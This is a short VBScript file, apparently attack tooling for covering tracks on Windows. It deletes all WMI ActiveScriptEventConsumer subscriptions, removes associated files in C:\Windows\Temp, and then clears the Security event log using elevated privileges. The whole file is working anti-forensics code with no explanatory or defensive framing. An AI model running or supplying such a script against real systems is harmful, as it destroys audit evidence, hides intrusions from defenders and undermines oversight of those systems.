Set objWMIService = GetObject("winmgmts:\\.\root\subscription")
Set ScriptIds = objWMIService.ExecQuery("select * from ActiveScriptEventConsumer")
Set fso=CreateObject("Scripting.FileSystemObject")
If ScriptIds.count<>0 Then
    For Each Object In ScriptIds
            Object.Delete_
            FilePath = "C:\Windows\Temp\"
            If fso.fileExists(FilePath & Object.Name & ".txt") Then
                fso.DeleteFile(FilePath & Object.Name & ".txt")
            ElseIf fso.fileExists(FilePath & Object.Name & "er.txt") Then
                fso.DeleteFile(FilePath & Object.Name & "er.txt")
            End If
    Next
End If
Set LogFileSet = GetObject("winmgmts:{(Backup,Security)}").ExecQuery("select * from Win32_NTEventLogFile where LogfileName='security'")

for each Logfile in LogFileSet
	RetVal = LogFile.ClearEventlog()
next